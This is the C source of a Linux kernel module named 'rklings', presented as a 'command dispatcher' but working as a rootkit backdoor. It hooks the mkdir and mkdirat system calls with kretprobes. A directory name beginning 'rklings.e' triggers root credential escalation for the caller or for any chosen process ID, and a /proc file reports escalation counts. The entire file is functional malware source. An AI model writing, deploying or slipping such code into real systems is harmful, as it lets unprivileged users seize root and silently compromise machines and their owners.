// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/ptrace.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/atomic.h>
#include <linux/uaccess.h>

#define RK_PREFIX     "rklings."
#define RK_PREFIX_LEN 8
#define RK_PATH_MAX   128

static unsigned int escalation_count;
static atomic_t deferred_pid = ATOMIC_INIT(0);

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	escalation_count++;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(int pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	escalation_count++;
	return 0;
}

static int rk_try_deferred(void)
{
	int pid = atomic_read(&deferred_pid);
	int ret;

	if (pid <= 0)
		return 0;
	ret = rk_escalate_pid(pid);
	if (ret == 0)
		atomic_set(&deferred_pid, 0);
	return ret;
}

static int rk_cmd_ping(const char *arg)
{
	pr_info("rklings: dispatch: cmd=ping\n");
	return 0;
}

static int rk_cmd_status(const char *arg)
{
	pr_info("rklings: alive, escalations=%u, deferred=%d\n",
		escalation_count, atomic_read(&deferred_pid));
	return 0;
}

static int rk_cmd_escalate(const char *arg)
{
	int pid;
	int ret;

	if (!arg)
		return rk_escalate();

	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;

	ret = rk_escalate_pid(pid);
	if (ret == -ESRCH) {
		atomic_set(&deferred_pid, pid);
		return 0;
	}
	return ret;
}

typedef int (*rk_handler_t)(const char *arg);

struct rk_cmd_entry {
	const char *key;
	rk_handler_t handler;
};

static const struct rk_cmd_entry cmd_table[] = {
    {"e", rk_cmd_escalate},
    {"ping", rk_cmd_ping},
    {"status", rk_cmd_status},
};

static int rk_dispatch(const char *name)
{
	const char *suffix;
	const char *dot;
	const char *arg;
	int cmd_len;
	int i;

	suffix = name + RK_PREFIX_LEN;

	dot = strchr(suffix, '.');
	if (dot) {
		cmd_len = dot - suffix;
		arg = dot + 1;
	} else {
		cmd_len = strlen(suffix);
		arg = NULL;
	}

	for (i = 0; i < ARRAY_SIZE(cmd_table); i++) {
		int klen = strlen(cmd_table[i].key);

		if (cmd_len == klen &&
		    strncmp(suffix, cmd_table[i].key, klen) == 0)
			return cmd_table[i].handler(arg);
	}

	return -ENOENT;
}

struct rk_mkdir_data {
	int result;
	bool intercepted;
};

static int rk_do_entry(struct kretprobe_instance *inst,
		       const char __user *pathname)
{
	struct rk_mkdir_data *data;
	char buf[RK_PATH_MAX];
	const char *base;
	long copied;

	data = (struct rk_mkdir_data *)inst->data;
	data->intercepted = false;

	copied = strncpy_from_user(buf, pathname, sizeof(buf));
	if (copied <= 0)
		return 0;

	base = strrchr(buf, '/');
	base = base ? base + 1 : buf;

	if (strncmp(base, RK_PREFIX, RK_PREFIX_LEN) != 0)
		return 0;

	data->result = rk_dispatch(base);
	data->intercepted = true;

	put_user('\0', (char __user *)pathname);
	return 0;
}

/* mkdir(pathname, mode): pathname in di */
static int rk_mkdir_entry(struct kretprobe_instance *inst, struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_entry(inst, (const char __user *)uregs->di);
}

/* mkdirat(dfd, pathname, mode): pathname in si */
static int rk_mkdirat_entry(struct kretprobe_instance *inst,
			    struct pt_regs *regs)
{
	struct pt_regs *uregs;

	uregs = (struct pt_regs *)regs_get_kernel_argument(regs, 0);
	if (!uregs)
		return 0;
	return rk_do_entry(inst, (const char __user *)uregs->si);
}

static int rk_mkdir_return(struct kretprobe_instance *inst,
			   struct pt_regs *regs)
{
	struct rk_mkdir_data *data;

	data = (struct rk_mkdir_data *)inst->data;
	if (data->intercepted)
		regs_set_return_value(regs, (unsigned long)(long)data->result);
	return 0;
}

static struct kretprobe rk_mkdir_probe = {
    .kp.symbol_name = "__x64_sys_mkdir",
    .entry_handler = rk_mkdir_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

static struct kretprobe rk_mkdirat_probe = {
    .kp.symbol_name = "__x64_sys_mkdirat",
    .entry_handler = rk_mkdirat_entry,
    .handler = rk_mkdir_return,
    .data_size = sizeof(struct rk_mkdir_data),
    .maxactive = 8,
};

static int rk_proc_show(struct seq_file *m, void *v)
{
	int dpid;

	rk_try_deferred();
	dpid = atomic_read(&deferred_pid);
	if (dpid > 0)
		seq_printf(m, "deferred: %d\n", dpid);
	else
		seq_puts(m, "idle\n");
	seq_printf(m, "escalations: %u\n", escalation_count);
	return 0;
}

static int __init rk_init(void)
{
	int ret;

	ret = register_kretprobe(&rk_mkdir_probe);
	if (ret)
		return ret;
	ret = register_kretprobe(&rk_mkdirat_probe);
	if (ret) {
		unregister_kretprobe(&rk_mkdir_probe);
		return ret;
	}
	proc_create_single("rklings", 0444, NULL, rk_proc_show);
	return 0;
}

static void __exit rk_exit(void)
{
	remove_proc_entry("rklings", NULL);
	unregister_kretprobe(&rk_mkdirat_probe);
	unregister_kretprobe(&rk_mkdir_probe);
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Rklings command dispatcher");
